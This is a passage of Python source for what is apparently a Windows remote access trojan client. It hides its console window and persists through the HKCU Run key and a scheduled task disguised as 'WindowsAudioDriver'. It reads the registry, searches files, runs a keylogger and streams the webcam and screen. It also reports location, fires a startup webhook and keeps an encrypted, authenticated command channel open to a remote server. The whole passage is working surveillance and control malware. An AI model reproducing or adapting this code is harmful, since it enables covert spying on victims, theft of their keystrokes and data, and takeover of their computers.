                'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
                'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
                'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
                'HKEY_USERS': winreg.HKEY_USERS,
                'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG
            }
            root, *subkeys = key_path.split('\\', 1)
            root_hkey = root_key_map.get(root.upper())
            if not root_hkey:
                self.send_response('error', b'Invalid root key', cmd_id)
                return
            subkey = subkeys[0] if subkeys else ''
            with winreg.OpenKey(root_hkey, subkey, 0, winreg.KEY_READ) as key:
                values = []
                i = 0
                while True:
                    try:
                        values.append(winreg.EnumValue(key, i))
                        i += 1
                    except OSError:
                        break
                self.send_response('generic_file', json.dumps({
                    'filename': 'registry.txt',
                    'content_b64': base64.b64encode(json.dumps(values, indent=2).encode()).decode()
                }).encode(), cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_add_to_startup(self, cmd_id, data):
        try:
            import winreg
            exe_path = sys.executable
            # Add to HKCU Run
            key = winreg.HKEY_CURRENT_USER
            subkey = r'Software\Microsoft\Windows\CurrentVersion\Run'
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, 'WindowsAudioDriver', 0, winreg.REG_SZ, exe_path)
            # Add scheduled task (requires schtasks)
            subprocess.Popen(f'schtasks /create /tn "WindowsAudioDriver" /tr "{exe_path}" /sc onlogon /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send_response('error', b'Added to startup', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_remove_from_startup(self, cmd_id, data):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r'Software\Microsoft\Windows\CurrentVersion\Run'
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, 'WindowsAudioDriver')
            subprocess.Popen('schtasks /delete /tn "WindowsAudioDriver" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send_response('error', b'Removed from startup', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_file_search(self, cmd_id, data):
        parts = data.decode().split('|', 1)
        search_dir = parts[0] if len(parts) > 0 else 'C:\\'
        pattern = parts[1] if len(parts) > 1 else '*.*'
        try:
            import fnmatch
            results = []
            for root, dirs, files in os.walk(search_dir):
                for name in fnmatch.filter(files, pattern):
                    results.append(os.path.join(root, name))
                if len(results) > 1000:
                    break
            self.send_response('error', json.dumps(results).encode(), cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    # ---------- Stress ----------
    def cmd_stress_cpu(self, cmd_id, data):
        seconds = struct.unpack('>I', data)[0]
        end = time.time() + seconds
        while time.time() < end:
            _ = 1 + 1

    def cmd_stress_ram(self, cmd_id, data):
        mb = struct.unpack('>I', data)[0]
        try:
            block = bytearray(mb * 1024 * 1024)
            time.sleep(10)
            del block
        except MemoryError:
            pass

    def cmd_stress_gpu(self, cmd_id, data):
        seconds = struct.unpack('>I', data)[0]
        try:
            import numpy as np
            end = time.time() + seconds
            while time.time() < end:
                a = np.random.rand(1000, 1000)
                b = np.random.rand(1000, 1000)
                c = np.dot(a, b)
        except ImportError:
            self.send_response('error', b'numpy missing', cmd_id)

    # ---------- Location ----------
    def cmd_get_location(self, cmd_id, data):
        lat, lon = get_location()
        payload = json.dumps({'lat': lat, 'lon': lon}).encode()
        self.send_response('location_data', payload, cmd_id)

    # ---------- Streaming helpers ----------
    def _webcam_stream(self, cmd_id):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.send_response('error', b'Cannot open webcam', cmd_id)
                return
            while self.webcam_active:
                ret, frame = cap.read()
                if not ret:
                    break
                _, jpeg = cv2.imencode('.jpg', frame)
                self.send_response('webcam_frame', jpeg.tobytes(), cmd_id)
                time.sleep(0.1)
            cap.release()
        except Exception as e:
            self.send_response('error', f'Webcam error: {e}'.encode(), cmd_id)

    def _screen_stream(self, interval, cmd_id):
        try:
            import mss
            from PIL import Image
            with mss.mss() as sct:
                while self.screen_active:
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=50)
                    compressed = zlib.compress(buf.getvalue())
                    self.send_response('screen_frame', compressed, cmd_id)
                    time.sleep(interval/1000.0)
        except ImportError:
            self.send_response('error', b'MSS or PIL not installed', cmd_id)
        except Exception as e:
            self.send_response('error', f'Screen error: {e}'.encode(), cmd_id)

    def _screenshot_scheduler(self, interval, cmd_id):
        try:
            import mss
            from PIL import Image
            with mss.mss() as sct:
                while self.screenshot_scheduler_active:
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=50)
                    compressed = zlib.compress(buf.getvalue())
                    self.send_response('screen_frame', compressed, cmd_id)
                    time.sleep(interval)
        except ImportError:
            self.send_response('error', b'MSS/PIL missing', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def _keylogger_capture(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if not self.keylogger_active:
                    return False
                try:
                    self.keylog_buffer.append(key.char)
                except AttributeError:
                    self.keylog_buffer.append(str(key))
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except:
            pass

# ---------- Main connection loop ----------
def main():
    # Hide console
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    # Send webhook with detailed info on startup
    info = get_webhook_info()
    send_webhook(info)

    # Start crash recovery watchdog
    start_crash_recovery()

    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if hasattr(socket, 'TCP_KEEPIDLE'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5)
            if hasattr(socket, 'TCP_KEEPINTVL'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 3)
            if hasattr(socket, 'TCP_KEEPCNT'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)

            # SSL wrapping if enabled
            if USE_SSL:
                context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT)
                context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
                sock = context.wrap_socket(sock, server_hostname=SERVER_IP)

            sock.settimeout(10)
            sock.connect((SERVER_IP, SERVER_PORT))

            # Auth handshake
            token = AUTH_TOKEN.encode()
            sock.sendall(struct.pack('>I', len(token)) + token)
            ack = sock.recv(1)
            if ack != b'\x01':
                sock.close()
                time.sleep(5)
                continue

            chal_len_data = recv_all(sock, INT_LEN)
            if not chal_len_data:
                sock.close(); continue
            chal_len = struct.unpack('>I', chal_len_data)[0]
            challenge = recv_all(sock, chal_len)
            resp = hmac.new(MASTER_ENC_KEY, challenge, hashlib.sha256).digest()
            sock.sendall(struct.pack('>I', len(resp)) + resp)

            key_len_data = recv_all(sock, INT_LEN)
            key_len = struct.unpack('>I', key_len_data)[0]
            enc_keys = recv_all(sock, key_len)
            dec = decrypt_data_aes256(enc_keys, MASTER_ENC_KEY)
            session_enc = dec[:32]
            session_mac = dec[32:64]

            # Set timeout for receives
            sock.settimeout(10.0)
            handler = CommandHandler(sock, session_enc, session_mac)

            # Send any offline queued responses
            for item in offline_queue.get_all():
                try:
                    data = base64.b64decode(item['data'])
                    type_bytes = item['type'].encode()
                    payload = struct.pack('>I', len(type_bytes)) + type_bytes
                    payload += struct.pack('>I', item['cmd_id'])
                    payload += struct.pack('>I', len(data)) + data
                    packed = secure_pack(payload, session_enc, session_mac)
                    sock.sendall(packed)
                except:
                    # Re-queue if failed
                    offline_queue.put(item)

            last_activity = time.time()
            while True:
                try:
                    msg = secure_unpack(sock, session_enc, session_mac)
                    if msg is not None:
                        handler.handle_command(msg)
                        last_activity = time.time()
                    else:
                        if time.time() - last_activity > HEARTBEAT_INTERVAL:
                            # Send heartbeat
                            type_bytes = b'heartbeat'
                            payload = struct.pack('>I', len(type_bytes)) + type_bytes
                            payload += struct.pack('>I', 0)
                            payload += struct.pack('>I', 0)
                            packed = secure_pack(payload, session_enc, session_mac)
                            sock.sendall(packed)
                            last_activity = time.time()
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        time.sleep(5)

if __name__ == '__main__':
    main()